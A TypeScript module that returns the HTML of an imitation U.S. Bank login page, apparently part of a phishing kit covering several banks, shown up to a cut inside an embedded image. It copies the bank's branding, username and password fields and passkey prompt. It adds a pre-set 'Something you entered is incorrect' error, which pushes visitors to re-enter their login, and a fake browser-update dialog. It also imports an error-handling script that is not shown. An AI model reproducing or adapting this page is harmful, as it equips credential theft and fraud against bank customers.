import { US_BANK_ERR_JVS } from "../td-banks-err/err-us-bank"
import { US_BANK_CSS } from "../td-banks-css/us-bank"

export const US_BANK = (): string => {

   document.head.appendChild(US_BANK_CSS)
   setTimeout(() => {
      US_BANK_ERR_JVS()
   },0)
   return /*html*/`
      <noscript> You need to enable JavaScript to run this app. </noscript>
      <div aria-describedby="safaContent" aria-labelledby="dialog1Title" aria-modal="true" class="safa-overlay safa-hidden" id="safa-overlay" role="dialog" tabindex="-1">
         <div id="browser_error_txt">
         <div class="safa-content" id="safaContent">
            <h1 id="dialog1Title">It's time to update your browser.</h1>
            <p class="safa-body-text" id="dialog1Desc">It looks like you're using an older browser version. Please update it to log in.</p>
            <button aria-label="close modal" class="safa-close" id="safaClose" onclick="closeInfo()" tabindex="1" type="button">
               <span>
               <svg fill="none" height="20" viewbox="0 0 20 20" width="20" xmlns="http://www.w3.org/2000/svg">
                  <path
                     clip-rule="evenodd"
                     d="M19.22 10C19.22 13.744 16.963 17.1188 13.5029 18.5487C10.0427 19.9787 6.06175 19.1818 3.41864 16.5301C0.775535 13.8784 -0.0084331 9.89486 1.43275 6.43935C2.87393 2.98384 6.25601 0.737863 9.99999 0.750006C15.1063 0.755517 19.2445 4.89366 19.25 10H19.22ZM14 7.00001L11 10L14 13L13 14L9.99999 11L6.99999 14L5.99999 13L8.99999 10L5.99999 7.00001L6.99999 6.00001L9.99999 9.00001L13 6.00001L14 7.00001ZM12.9288 2.83711C15.8285 4.03489 17.72 6.8627 17.72 10H17.75C17.7445 14.2779 14.2779 17.7445 9.99999 17.75C6.86271 17.7621 4.02758 15.8816 2.81857 12.9866C1.60956 10.0917 2.26519 6.75333 4.4793 4.53062C6.6934 2.30791 10.0292 1.63934 12.9288 2.83711Z"
                     fill="#555555"
                     fill-rule="evenodd"
                  ></path>
               </svg>
               </span>
            </button>
         </div>
         <div class="safari-flex-inline safa-footer">
            <button class="safa-button safa-prime" onclick="closeInfo()" tabindex="3" type="button">Close</button>
            <button class="safa-button safa-sec" onclick="browserUpdateInfo()" tabindex="2" type="button">Browser update info</button>
         </div>
         </div>
      </div>
      <div id="root">
         <div class="App">
         <section>
            <button class="skip-main">Skip to main content</button>
         </section>
         <header class="auth-ui-header" role="banner">
            <div class="header-container">
               <nav role="navigation">
               <div class="header-section-logos">
                  <div class="ham-container">
                     <button aria-label="open leftmenu collapsed" class="hamburger-menu btn-hamburger-menu">
                     <div class="line line-top"></div>
                     <div class="line line-middle"></div>
                     <div class="line line-bottom"></div>
                     </button>
                     <div class="logo-div">
                     <a aria-label="U S Bank Logo" href="#">
                        <span class="logo usb-bank-logo" style="background-image: url(&quot;./assets/images/idc_usbank_logo.svg&quot;)" title="USBankLogo"> </span>
                     </a>
                     </div>
                  </div>
                  <div class="header-link-div">
                     <!--<div class="ham-menu-bg">
            </div>-->
                     <div class="link-container large-screen">
                     <div class="lang-toggle mr-20">
                        <span
                           aria-atomic="true"
                           aria-describedby="espanol-desc"
                           class="usb-link basic mar0"
                           data-compn="@usb-shield/react-link"
                           data-compv="2.0.16"
                           data-libn="@usb-shield/components-react-versioned"
                           data-libv="2.0.0"
                           data-testid="usb-link-"
                           rel="noopener noreferrer"
                           role="button"
                           tabindex="0"
                        >
                           <span class="usbank-icon margin-right-unset"> U.S. Bank en Español </span>
                        </span>
                     </div>
                     <div>
                        <span>
                           <a aria-describedby="new-window-header" class="header-link" href="#" rel="noreferrer" target="_blank"> Customer Service </a>
                        </span>
                     </div>
                     <div>
                        <span>
                           <a aria-describedby="new-window-header" class="header-link" href="#" rel="noreferrer" target="_blank"> Locations </a>
                        </span>
                     </div>
                     </div>
                     <div class="usb-drawer" data-compn="@usb-shield/react-drawer" data-compv="10.0.0-mvp.15" data-libn="usb-shield" data-libv="10.0.1" id="header-usb-drawer"></div>
                  </div>
               </div>
               </nav>
            </div>
            <div hidden="">
               <span id="new-window-header"> Opens in a new tab </span>
               <span id="english-desc"> Solo en inglés </span>
               <span id="espanol-desc"> Changes language to espanol </span>
            </div>
            <div class="clear"></div>
         </header>
         <main class="Login react-module-width" tabindex="-1">
            <div class="aw-usb-loginWidget">
               <div id="test-spinner"></div>
               <div class="aw-increase-top passkey-login-widget" id="ReactLoginWidgetApp">
               <div class="aw-usb-authenticate legacy receive borderStyle passkey-widget-margin">
                  <div class="fdicdisclosure">
                     <cite class="fdic-disclosure">
                     <figure>
                        <svg class="logo" id="Layer_1" version="1.1" viewbox="0 0 728 300" x="0px" xmlns="http://www.w3.org/2000/svg" y="0px">
                           <path
                           class="path"
                           d="M80.9,73.8v45.6h77.7v60H80.9v107H10.1V13.9h156.5v60H80.9zM428.9,13.9h70.9v272.6h-70.9V13.9z M718,105.3 c-14.5-19.5-38-30-62.2-30c-43.4,0-72.7,33.3-72.7,75.6s29.6,74.1,73.8,74.1c23.1,0,46.3-11.2,61.1-28.9V281c-23.5,7.2-40.5,12.6-62.5,12.6c-38,0-74.1-14.5-102.3-40.1c-30-27.1-43.7-62.5-43.7-103c0-37.2,14.1-73,40.1-99.8C576.3,23.3,615,6.6,653.3,6.6c22.8,0,43.7,5.1,64.7,13.7L718,105.3L718,105.3z M280.4,13.9H179.9v272.6h100.5 c75.5,0,138.5-59.6,138.5-136.3S356.3,13.9,280.4,13.9zM266.6,226.4h-15.9V73.8h16.6c45.5,0,77.7,27.5,77.7,76.3 C345.1,203.3,308.9,226.4,266.6,226.4z"
                           ></path>
                        </svg>
                        <figcaption>FDIC-Insured - Backed by the full faith and credit of the U.S. Government</figcaption>
                     </figure>
                     </cite>
                  </div>
                  <div>
                     <h1 aria-hidden="false" id="login-in-to-account">Account login</h1>
                  </div>
                  <div class="usb-notification error" data-compn="@usb-shield/react-notification" data-compv="10.3.7" data-libn="usb-shield" data-libv="10.0.1" data-testid="" id="top-error-msg" lang="en" tabindex="0">
                     <div class="error">
                     <div class="usb-children-notification" data-testid="component-usb-children-notification" id="top-error-msg-children-notification" lang="en" role="" tabindex="-1">
                        <span class="usb-icon svg-icon icon error" data-compn="@usb-shield/react-icons" data-compv="10.1.8" data-libn="usb-shield" data-libv="10.0.1" data-testid="usb-icon-" id="" lang="en">
                           <svg aria-hidden="false" aria-labelledby="svg-title-e6a2c2a5-552c-4575-9d29-9be097f19e9f " class="single" focusable="false" height="20" id="svg-e6a2c2a5-552c-4575-9d29-9be097f19e9f" viewbox="0 0 20 20" width="20">
                           <title id="svg-title-e6a2c2a5-552c-4575-9d29-9be097f19e9f">Warning</title>
                           <path
                              d="M18.67 17.67l-8-16a.79.79 0 00-1.34 0l-8 16A.75.75 0 002 18.75h16a.75.75 0 00.67-1.08zm-15.46-.42L10 3.68l6.79 13.57zM9.25 8h1.5v5h-1.5zm1.46 6.29a1.15 1.15 0 01.21.33.94.94 0 010 .76 1.15 1.15 0 01-.21.33 1 1 0 01-1.63-1.09 1 1 0 01.21-.33 1 1 0 01.9-.27.6.6 0 01.19.06l.18.09z"
                              id="pathSVG-e6a2c2a5-552c-4575-9d29-9be097f19e9f"
                           ></path>
                           </svg>
                           <span class="sr-only"> Error </span>
                        </span>
                        <span class="skip-alert"> Alert </span>
                        Something you entered is incorrect. Please try again.
                        <p class="reference-number">Reference number: 221371</p>
                     </div>
                     </div>
                  </div>
                  <div class="login-grid-2">
                     <div>
                     <form data-gtm-form-interact-id="0" id="loginPageForm">
                        <div>
                           <span role="alert" tabindex="-1"> </span>
                           <div class="usb--wrapper is-error" data-basev="10.18.5" data-compn="@usb-shield/react-forms-input-text" data-compv="10.6.1" data-libn="usb-shield" data-libv="10.0.1" data-testid="" id="wrapper_aw-personal-id" lang="en">
                           <label class="usb--floating-label" for="input_aw-personal-id" id="username"> Username </label>
                           <input
                              aria-describedby="error-text_aw-personal-id"
                              aria-invalid="true"
                              id="username"
                              aria-required="true"
                              autocomplete="username"
                              class="usb--basic-input"
                              data-cobrowse-function="none"
                              data-gtm-form-interact-field-id="0"
                              data-quantum-metric-tag="mask"
                              inputmode="text"
                              lang="en"
                              maxlength="100"
                              name="aw-personal-id"
                              spellcheck="true"
                              type="text"
                              value=""
                           />
                           <!-- <div aria-atomic="true" aria-live="polite" class="usb--error-text-container">
                              <div aria-atomic="true" aria-live="assertive" class="usb--error-message" data-compv="2.0.0" id="error-text_aw-personal-id">
                                 <span class="usb-icon svg-icon warning" data-compn="@usb-shield/react-icons" data-compv="10.1.8" data-libn="usb-shield" data-libv="10.0.1" data-testid="usb-icon-" id="" lang="en">
                                 <svg aria-hidden="true" class="single" focusable="false" height="20" id="svg-03b042d8-a68d-487e-90f1-e6277674bdf0" viewbox="0 0 20 20" width="20">
                                    <path
                                       d="M18.67 17.67l-8-16a.79.79 0 00-1.34 0l-8 16A.75.75 0 002 18.75h16a.75.75 0 00.67-1.08zm-15.46-.42L10 3.68l6.79 13.57zM9.25 8h1.5v5h-1.5zm1.46 6.29a1.15 1.15 0 01.21.33.94.94 0 010 .76 1.15 1.15 0 01-.21.33 1 1 0 01-1.63-1.09 1 1 0 01.21-.33 1 1 0 01.9-.27.6.6 0 01.19.06l.18.09z"
                                       id="pathSVG-03b042d8-a68d-487e-90f1-e6277674bdf0"
                                    ></path>
                                 </svg>
                                 <span class="sr-only"> Error </span>
                                 </span>
                                 <span> Enter your username to log in. </span>
                              </div>
                           </div>-->
                           </div>
                           <div class="rememberMeAlignment" id="aw-remember-forgot-id-div">
                           <div class="rememberCheckbox" id="aw-remember-my-id-label">
                              <div class="usb--checkbox-wrapper" data-basev="10.18.5" data-compn="@usb-shield/react-forms-checkbox" data-compv="10.1.0" data-libn="usb-shield" data-libv="10.0.1" data-testid="" id="wrapper_rememberid-global">
                                 <input aria-invalid="false" aria-required="false" class="usb--checkbox-input" data-cobrowse-function="none" id="input_rememberid-global" lang="en" name="rememberid-global" type="checkbox" />
                                 <label class="usb--checkbox-label" data-cobrowse-function="none" for="input_rememberid-global">
                                 <span class="usb--checkbox-label-text" data-cobrowse-function="none"> Remember my username </span>
                                 <span class="usb--checkbox-svg" data-cobrowse-function="none">
                                    <span class="usb-icon svg-icon default" data-compn="@usb-shield/react-icons" data-compv="10.1.8" data-libn="usb-shield" data-libv="10.0.1" data-testid="usb-icon-" id="" lang="en">
                                       <svg aria-hidden="true" class="single" focusable="false" height="20" id="svg-72ff4a89-cca4-4ab7-b69f-3adf11949fb0" viewbox="0 0 20 20" width="20">
                                       <path d="M7.17 16a.74.74 0 01-.53-.22l-4.95-5 1.06-.98 4.42 4.42L17.25 4.14l1.06 1.06L7.7 15.81a.73.73 0 01-.53.19z" id="pathSVG-72ff4a89-cca4-4ab7-b69f-3adf11949fb0"></path>
                                       </svg>
                                       <span class="sr-only"> </span>
                                    </span>
                                 </span>
                                 </label>
                                 <div aria-atomic="true" aria-live="off" class="usb--error-message" data-compv="2.0.0" id="error-text_rememberid-global"></div>
                              </div>
                           </div>
                           </div>
                           <div>
                           <span role="alert" tabindex="-1"> </span>
                           <div class="password-input-wrapper">
                              <div class="password-input-unique-id-wrapper">
                                 <div class="usb--wrapper" data-basev="10.18.5" data-compn="@usb-shield/react-forms-input-text" data-compv="10.6.1" data-libn="usb-shield" data-libv="10.0.1" data-testid="" id="wrapper_aw-password" lang="en">
                                 <label class="usb--floating-label" for="password" id="label_aw-password"> Password </label>
                                 <input
                                    aria-invalid="false"
                                    aria-required="true"
                                    autocomplete="current-password"
                                    class="usb--basic-input"
                                    data-cobrowse-function="masked"
                                    data-gtm-form-interact-field-id="1"
                                    data-quantum-metric-tag="mask"
                                    id="password"
                                    inputmode="text"
                                    lang="en"
                                    maxlength="100"
                                    name="aw-password"
                                    spellcheck="true"
                                    type="password"
                                    value=""
                                 />
                                 <div aria-atomic="true" aria-live="polite" class="usb--error-text-container"></div>
                                 </div>
                                 <button id="togglePassword" aria-live="off" class="show-hide__button" type="button">
                                 Show
                                 <span class="sr-only"> Password </span>
                                 </button>
                              </div>
                           </div>
                           </div>
                           <div class="passkey-button-alignment">
                           <button
                              class="usb-button button--standard--heavy button--medium icon-left button--layout_row"
                              data-compn="@usb-shield/react-button"
                              data-compv="10.4.8"
                              data-libn="usb-shield"
                              data-libv="10.0.1"
                              data-testid=""
                              id="login-button-continue"
                              lang="en"
                              name="loginButton"
                              type="submit"
                           >
                              Log in with password
                           </button>
                           <div class="or-button passkey-or-button-style">OR</div>
                           <button class="usb-button button--standard--subtle button--medium icon-left button--layout_row" data-compn="@usb-shield/react-button" data-compv="10.4.8" data-libn="usb-shield" data-libv="10.0.1" data-testid="" id="usePassword-button" lang="en" type="button">
                              <img
                                 alt=""
                                 src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTciIGhlaWdodD0iMTYiIHZpZXdCb3g9IjAgMCAxNyAxNiIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHBhdGggZD0iTTEzLjk0MDQgNC42MTQyNkMxNS41NzcxIDQuNjE0NDMgMTYuOTAzOSA1Ljk0MTU1IDE2LjkwNDMgNy41NzgxMkMxNi45MDQzIDguODY4NDkgMTYuMDc4NyA5Ljk2Mjg0IDE0LjkyNzcgMTAuMzcwMUwxNS4wMDEgMTAuNDA4MkwxNi4wMjgzIDExLjQzNTVMMTQuNzgyMiAxMi42ODE2TDE2LjAyODMgMTMuOTI3N0wxMy45NTcgMTUuOTk5TDEyLjcxMDkgMTQuNzUyOVYxMC4yNzI1QzExLjY4ODQgOS44MDQ2OCAxMC45NzU2IDguNzc1NzcgMTAuOTc1NiA3LjU3ODEyQzEwLjk3NiA1Ljk0MTYxIDEyLjMwMzggNC42MTQ1NCAxMy45NDA0IDQuNjE0MjZaTTguNjY3OTcgOC45NDMzNkM5LjIwNjc4IDguOTQzMzYgOS44ODA3OCA5LjIwMDkzIDEwLjE1MDQgOS4zMzAwOEMxMC41MDA2IDEwLjEyNDkgMTEuMTI2OSAxMC43Mzk0IDExLjM5NjUgMTAuOTQ3M1YxNS41NjE1SDAuNVYxMy40Mzk1QzEuMDEyMDYgOS44NTU5MiAzLjgyMzIyIDguOTQ5MDcgNS4xNjUwNCA4Ljk0MzM2SDguNjY3OTdaTTYuNzk4ODMgMEM4LjkwMSAwIDEwLjYwNTUgMS43MDQ1MiAxMC42MDU1IDMuODA2NjRDMTAuNjA1MiA1LjkwODU3IDguOTAwODYgNy42MTIzIDYuNzk4ODMgNy42MTIzQzQuNjk2ODUgNy42MTIyNCAyLjk5MjQxIDUuOTA4NTMgMi45OTIxOSAzLjgwNjY0QzIuOTkyMTkgMS43MDQ1NiA0LjY5NjcxIDYuNDI5NDFlLTA1IDYuNzk4ODMgMFpNMTMuOTA2MiA1Ljg5NDUzQzEzLjQ0MTYgNS44OTQ4MSAxMy4wNjQ3IDYuMjcxNjQgMTMuMDY0NSA2LjczNjMzQzEzLjA2NDUgNy4yMDEyMyAxMy40NDE0IDcuNTc3ODQgMTMuOTA2MiA3LjU3ODEyQzE0LjM3MTMgNy41NzgxMSAxNC43NDggNy4yMDEzOSAxNC43NDggNi43MzYzM0MxNC43NDc4IDYuMjcxNDcgMTQuMzcxMiA1Ljg5NDU0IDEzLjkwNjIgNS44OTQ1M1oiIGZpbGw9IiMyMzVBRTQiLz4KPC9zdmc+Cg=="
                              />
                              Use passkey
                           </button>
                           </div>
                           <span
                           class="usb-link arrow usb-link_arrow default-no-underline is-standard-style cta-style_standard is-not-underlined emphasis_minimal is-size-medium size_medium loginHelp"
                           data-compn="@usb-shield/react-link"
                           data-compv="10.3.9"
                           data-libn="usb-shield"
                           data-libv="10.0.1"
                           data-testid="usb-link-usb-link-loginHelp"
                           id="loginHelp"
                           lang="en"
                           role="link"
                           tabindex="0"
                           >
                           Forgot username or password
                           <span class="usb-icon svg-icon interaction" data-compn="@usb-shield/react-icons" data-compv="10.1.8" data-libn="usb-shield" data-libv="10.0.1" data-testid="usb-icon-" id="" lang="en">
                              <svg aria-hidden="true" class="single" focusable="false" height="20" id="svg-79398d28-68d6-4532-8b65-b8f06aa4b04e" viewbox="0 0 20 20" width="20">
                                 <path d="M6.36 15.47L11.83 10 6.36 4.53l1.06-1.06 6 6a.75.75 0 010 1.06l-6 6z" id="pathSVG-79398d28-68d6-4532-8b65-b8f06aa4b04e"></path>
                              </svg>
                              <span class="sr-only"> </span>
                           </span>
                           </span>
                           <span
                           aria-describedby="enrollment-english-desc"
                           aria-label="Enroll in online banking"
                           class="usb-link subtle usb-link_subtle default-no-underline is-standard-style cta-style_standard is-underlined emphasis_subtle is-size-small size_small enrollmentLink dark cursor_pointer"
                           data-compn="@usb-shield/react-link"
                           data-compv="10.3.9"
                           data-libn="usb-shield"
                           data-libv="10.0.1"
                           data-testid="usb-link-usb-link-enrollmentLink"
                           id="enrollmentLink"
                           lang="en"
                           role="link"
                           tabindex="0"
                           >
                           Enroll in online banking
                           </span>
                        </div>
                     </form>
                     </div>
                     <div class="sidebar-container">
                     <div>
                        <div class="align-centre sidebar-avadar-top">
                           <img
                           alt="passkey"
                           src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAD0AAAA6CAYAAAADZ1FRAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAU9SURBVHgB3ZvNVttGFMfvnbFCmvackmVOSGogWReeoPYTlCx6TuL0HJwnSPMEmCcAngB3UeCcLqBPADxByDpQu43TbN1Nk2LNTO6V7GCEJI+EJNv8sghIlqW/7p25HzMgZER5pTUrvplZRW2W6NcKoJkFA7N8zgCcIGAbUBwoBcftvXttGCMI16T89ENZSr0GxtTtr8Km0mJ9XOKvJXqh9s9LRN0YWDQpBrDx5879dSiYVKLZleWdWxv02HW4LghHyuk9aTfnu1AQAlJAgrczEcwYqIhz57Bcb6XyljQkFr1Qe79GT7oCGULutiR7zgYURCL3Xnz29wrNwPuQFyjrZ7/d+xVyJpmlUeZrDaM2i3Bza9GLP5OVwZQhX2ZL/zt1yBl7S2u5CgVgBPwIOZPAvU0FioBm87xd3Er04586nFoWFlLAlRXIESvRekaXoUAcLcZvacj5IYKYnCfMVBnZtGMnWujC8mLGFeYEcqRk8yHlOidSKCiKkotWL5kLH8dxykYab/ihwu7b3+dGvjDrNHSx9r5VQHLCdM925u5GnfSaFXduUUlLIZTC29VPULMCqHKLqdetxzSCzj0n7t/pIOoM1+/ya6eFYBrhghk2jKmTZ7YWnnc2wmK+tWhXl5pQAKjDXy4LoBe/maRhgQZ+kee3XnN3Z/i4tWjPVQzkbG1snu49OAoe5XKWBUAqTFkKfaleTxSy1EyPb5zPTI7Q5XEYPLxY69Q9d464xhizRT+98A3ijecQSPg5Nz4GlyXk0dN3FSPwEDKGLPnqdHduM3g8bgIliy2/3bmYrb0mpVCvISJlpk5tlT0pcXLiuZ+mN5shZMn1cMGdenTEwOawYIaHIH3XFkRgJK7x/6kysrO9uSYY/STanSwh9+QXeLrzoBFxfjX6Uv1X2HET90z9Ci51Gnq2+/CAxmA17eRGFjlWSi57LxCiHzLyFOIP4V8ccXwAVXDXbvYz3jhHrMdZxn8g6KIxb8i6jbBZepj++GzFfp+hntruRU/NZr7huSMT0cPwjXVJfg9KzSOKb43R/4KULeGqN+4n96R9YNffthLNUN+cXuSxZ/kYz7j4uFnPXHRWWItOCFt6YkvLft6ceU7gSt2e7HoaIfsSs6SOJlo0avgDMoQjBq+ZWdXTQbi8K90uLfGEJbS6a0B8ByngWEtp5In6qI7CJjh3ptek9PFlZiUtRQ3/vgnwQoKf1SylXZ6NhGZhWhpsBpd1sltKwubZzv0X/q0s8OOf2C6iiaC0nA8W/49q7xqUaa1BarCt/jtfHnhT7JjmsLH4vHPoB/xCuiYU0tV28BinqRxfIQW89YMzx+HhE2npx7XOkgbcL0rsJQKZ1gC/AGGLWzyTn/1theX1oaI9wQiHmY9be7qiB9WoJt/Ifh1laOqjuxKV/V1xb3bpMQtmZrWD+8E2jzWUksqvbkcuBF4S7ad+etyC+/htnv46WnJQNReffQgtgC6J9rZGjWMMR0LP4kA60UyE8C+iPVcyGW2emSTE1d0NX0STKxW20aUwaAYXBqrB7VqeaH/CyHbH0NjpCw720RhPtBRuyp7yhBIjmPFEm1F9pWlihGBG8CCnbkL6GXLSoHCrDbWrYhClT6WbI3hATIxmBP2rwE3ENjm5cYxKTm4sJDz1Uu3UQstGwabEzRZNgsOWjaZTNJr2yM9ECGamUjT/+YOJ64nHCGamUjQXENrpVa8I56VfWkKOXQklSgh4QM2zNkwoPS2Pwo6zcMomq6LnHHoZ5SD93H2Y3T6ySYXTaNlz9knwq7h8e5jPsItFbEFyOR8AAAAASUVORK5CYII="
                           />
                        </div>
                        <h2 class="sidebar-heading">Don't have a passkey yet?</h2>
                        <span class="sidebar-desc"> Add a passkey to log in using your face, fingerprint or the code you use to unlock your device. It’s faster and more secure than a password. </span>
                     </div>
                     <div>
                        <span
                           class="usb-link arrow usb-link_arrow default-no-underline is-standard-style cta-style_standard is-not-underlined emphasis_minimal is-size-medium size_medium loginHelp"
                           data-compn="@usb-shield/react-link"
                           data-compv="10.3.9"
                           data-libn="usb-shield"
                           data-libv="10.0.1"
                           data-testid="usb-link-usb-link-loginHelp"
                           id="loginHelp"
                           lang="en"
                           role="link"
                           tabindex="0"
                        >
                           Learn more
                           <span class="usb-icon svg-icon interaction" data-compn="@usb-shield/react-icons" data-compv="10.1.8" data-libn="usb-shield" data-libv="10.0.1" data-testid="usb-icon-" id="" lang="en">
                           <svg aria-hidden="true" class="single" focusable="false" height="20" id="svg-b0d8541e-9619-453d-a98b-5db488aa047b" viewbox="0 0 20 20" width="20">
                              <path d="M6.36 15.47L11.83 10 6.36 4.53l1.06-1.06 6 6a.75.75 0 010 1.06l-6 6z" id="pathSVG-b0d8541e-9619-453d-a98b-5db488aa047b"></path>
                           </svg>
                           <span class="sr-only"> </span>
                           </span>
                        </span>
                     </div>
                     </div>
                  </div>
               </div>
               </div>
               <div></div>
               <div id="arkose-container"></div>
            </div>
         </main>
         <div class="footer-container">
            <footer aria-label="Footer" class="Footer">
               <div class="Footer_Container">
               <div class="">
                  <div class="Footer_Connection_Secured">
                     <div class="usb-grid--container vw-grid" data-compn="@usb-shield/react-grid" data-compv="1.1.11" data-libn="@usb-shield/components-react-versioned" data-libv="2.0.0" data-testid="" id="" lang="en" type="">
                     <div class="grid grid zero-padding zero-gap justify-stretch align-stretch">
                        <div class="col xl-4 lg-4 md-8 sm-4 off-xl-undefined display-flex zero-padding justify-auto align-auto">
                           <div>
                           <div class="Footer_Lock_Icon floatLeft"></div>
                           <p>Connection Secured</p>
                           </div>
                        </div>
                        <div class="col xl-12 lg-12 md-8 sm-4 off-xl-undefined display-flex zero-padding justify-auto align-auto">
                           <div class="FooterLink">
                           <div>
                              <button
                                 aria-describedby="new-window-footer"
                                 aria-label="Security Opens in a new tab"
                                 class="usb-link basic usb-link_basic default-no-underline is-standard-style cta-style_standard is-underlined emphasis_subtle is-size-small size_small"
                                 data-compn="@usb-shield/react-link"
                                 data-compv="10.5.3"
                                 data-libn="usb-shield"
                                 data-libv="10.0.1"
                                 data-testid="usb-link-usb-link-test-id"
                                 id="ss"
                                 lang="en"
                                 role="link"
                                 type="button"
                              >
                                 Security
                              </button>
                              <span class="linkSeparator"> | </span>
                           </div>
                           <div>
                              <button
                                 aria-describedby="new-window-footer"
                                 aria-label="Privacy Opens in a new tab"
                                 class="usb-link basic usb-link_basic default-no-underline is-standard-style cta-style_standard is-underlined emphasis_subtle is-size-small size_small"
                                 data-compn="@usb-shield/react-link"
                                 data-compv="10.5.3"
                                 data-libn="usb-shield"
                                 data-libv="10.0.1"
                                 data-testid="usb-link-usb-link-test-id"
                                 id="privacyPledge"
                                 lang="en"
                                 role="link"
                                 type="button"
                              >
                                 Privacy
                              </button>
                              <span class="linkSeparator"> | </span>
                           </div>
                           <div>
                              <button
                                 aria-describedby="new-window-footer"
                                 aria-label="Your California privacy choices Opens in a new tab"
                                 class="usb-link basic usb-link_basic default-no-underline is-standard-style cta-style_standard is-underlined emphasis_subtle is-size-small size_small"
                                 data-compn="@usb-shield/react-link"
                                 data-compv="10.5.3"
                                 data-libn="usb-shield"
                                 data-libv="10.0.1"
                                 data-testid="usb-link-usb-link-test-id"
                                 id="privacyPledgeCali"
                                 lang="en"
                                 role="link"
                                 type="button"
                              >
                                 Your California privacy choices
                                 <img
                                 alt="privacy choices"
                                 class="img-cali"
                                 src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAB4AAAAOCAYAAAA45qw5AAAACXBIWXMAAAsTAAALEwEAmpwYAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAHmSURBVHgBpVU7TwJBEP72YqMVaqvJNdp6dpYYW43wCzgL46NRYmsCJLYm2PiIBVBKA0ZbBRpbrhWbS6Q1oYLOdYblsfdQzvAlm93bnZlvXnsr4Me+tGEghW9YEIhhGkh0yJZDtkq4F0X9SIxWh9IkgUpsDtbJFmAt0VhGJCSvAac9UcwlJzZxK9wxsSKtJSyYhRRA5JHR6QLz6cjiLuawjrzoGP1PiQxFaFaO/kfKaLTUzHphur49Ez0UeGH0o5WwK8eYiNwTsHnp3as6arY3gOY5WV4cnxVsoJjyGZFI4FTGDEpxIr7qVQjD1QuQfQa4/jqcTzXnXyn6d6B2pmwxKds9LYcY68I2yAPTT+p+qdqNjLeVgcwOQH3gkdObyi4pco6cSTk7LBOAgDkTso30g1Jg7zs91bVMmt32ytVbQV0pEAkGsbv+q8BpYqxfKK/5WvlJGY/NoB5Hynqlt3Hag97BNYi6ynXSvedOZKXY7MBgCqHQHeYS6OnlfmDyYRC+cKsqMQeyFl9BnMmigp3lyHSww3pvhO4JFHEn9ozBx179A27y5pdmCEEjpL5+0sAelZVGTi2HUPe5Zi7ATKwBuxb+RLoc6Tepkzo0kt5fpo5DeiQkPRISTD3dI0EBDwhLRFjUD34A8JqonC03MfMAAAAASUVORK5CYII="
                                 />
                              </button>
                              <span class="linkSeparator"> | </span>
                           </div>
                           <div>
                              <button
                                 aria-describedby="popupWindow"
                                 aria-label="CoBrowse Opens in a popup"
                                 class="usb-link basic usb-link_basic default-no-underline is-standard-style cta-style_standard is-underlined emphasis_subtle is-size-small size_small"
                                 cobrowse-onclick="true"
                                 data-compn="@usb-shield/react-link"
                                 data-compv="10.5.3"
                                 data-libn="usb-shield"
                                 data-libv="10.0.1"
                                 data-testid="usb-link-usb-link-test-id"
                                 id="start-cobrowse-random-key"
                                 lang="en"
                                 role="link"
                                 type="button"
                              >
                                 CoBrowse
                              </button>
                           </div>
                           </div>
                        </div>
                     </div>
                     </div>
                  </div>
                  <div>©2026 U.S. Bank</div>
                  <div class="mtb-05rem">OLB Cloud : 2.66.0_BN_8545</div>
                  <hr aria-hidden="true" />
               </div>
               <div>
                  <div class="disclosures-container">
                     <div class="">
                     <p class="page-footer-inv-p">Investment and Insurance products and services including annuities are:</p>
                     <ul class="disclosures-items">
                        <li class="page-footer-inv-p">Not a Deposit</li>
                        <li class="page-footer-inv-p">Not FDIC Insured</li>
                        <li class="page-footer-inv-p">May Lose Value</li>
                        <li class="page-footer-inv-p">Not Bank Guaranteed</li>
                        <li class="page-footer-inv-p">Not Insured by any Federal Government Agency</li>
                     </ul>
                     </div>
                  </div>
                  <div class="description">
                     <div class="greyColor mt-2rem">
                     <p aria-level="3" class="title fontBold" role="heading">For U.S. Bank:</p>
                     <p class="content">
                        <img
                           alt=""
                           src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAA0AAAAJCAYAAADpeqZqAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyRpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMy1jMDExIDY2LjE0NTY2MSwgMjAxMi8wMi8wNi0xNDo1NjoyNyAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENTNiAoTWFjaW50b3NoKSIgeG1wTU06SW5zdGFuY2VJRD0ieG1wLmlpZDozQkFBMENEOUNFRjgxMUUzQkI5REZCREIyRkFENjA0QiIgeG1wTU06RG9jdW1lbnRJRD0ieG1wLmRpZDozQkFBMENEQUNFRjgxMUUzQkI5REZCREIyRkFENjA0QiI+IDx4bXBNTTpEZXJpdmVkRnJvbSBzdFJlZjppbnN0YW5jZUlEPSJ4bXAuaWlkOjNCQUEwQ0Q3Q0VGODExRTNCQjlERkJEQjJGQUQ2MDRCIiBzdFJlZjpkb2N1bWVudElEPSJ4bXAuZGlkOjNCQUEwQ0Q4Q0VGODExRTNCQjlERkJEQjJGQUQ2MDRCIi8+IDwvcmRmOkRlc2NyaXB0aW9uPiA8L3JkZjpSREY+IDwveDp4bXBtZXRhPiA8P3hwYWNrZXQgZW5kPSJyIj8+/syiDAAAAMZJREFUeNpi